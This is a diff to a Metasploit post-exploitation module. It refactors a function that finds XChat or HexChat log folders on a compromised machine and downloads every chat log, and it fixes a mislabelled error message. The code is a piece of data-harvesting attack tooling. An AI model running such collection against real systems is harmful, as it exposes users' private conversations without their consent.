@@ -129,38 +129,28 @@ class MetasploitModule < Msf::Post
 
   def get_chatlogs(base, mode = 'HEXCHAT')
     logs = []
-    if mode == 'XCHAT'
+
+    case mode
+    when 'XCHAT'
       base_logs = "#{base}#{sep}xchatlogs"
-      unless directory? base_logs
-        vprint_error("Chat logs not found at #{base_logs}")
-        return logs
-      end
-
-      list_logs(base_logs, 'XCHAT').each do |l|
-        vprint_status("Downloading: #{l}")
-        data = read_file(l)
-        logs << {
-          filename: l,
-          data: data
-        }
-      end
-    elsif mode == 'HEXCHAT'
+    when 'HEXCHAT'
       base_logs = "#{base}#{sep}logs"
-      unless directory? base_logs
-        vprint_error("Chat logs not found at #{base_logs}")
-        return logs
-      end
-
-      list_logs(base_logs).each do |l|
-        vprint_status("Downloading: #{l}")
-        data = read_file(l)
-        logs << {
-          filename: l,
-          data: data
-        }
-      end
+    else
+      vprint_error("Invalid mode: #{mode}")
+      return logs
     end
-
+    unless directory? base_logs
+      vprint_error("Chat logs not found at #{base_logs}")
+      return logs
+    end
+    list_logs(base_logs, mode).each do |l|
+      vprint_status("Downloading: #{l}")
+      data = read_file(l)
+      logs << {
+        filename: l,
+        data: data
+      }
+    end
     logs
   end
 
@@ -239,7 +229,7 @@ class MetasploitModule < Msf::Post
     if datastore['XCHAT']
       get_paths('XCHAT').each do |base|
         unless directory? base
-          print_error("HexChat not installed or used by user. #{base} not found.")
+          print_error("XChat not installed or used by user. #{base} not found.")
         end
 
         configs = get_configs(base, 'XCHAT') if action.name =~ /ALL|CONFIGS/i
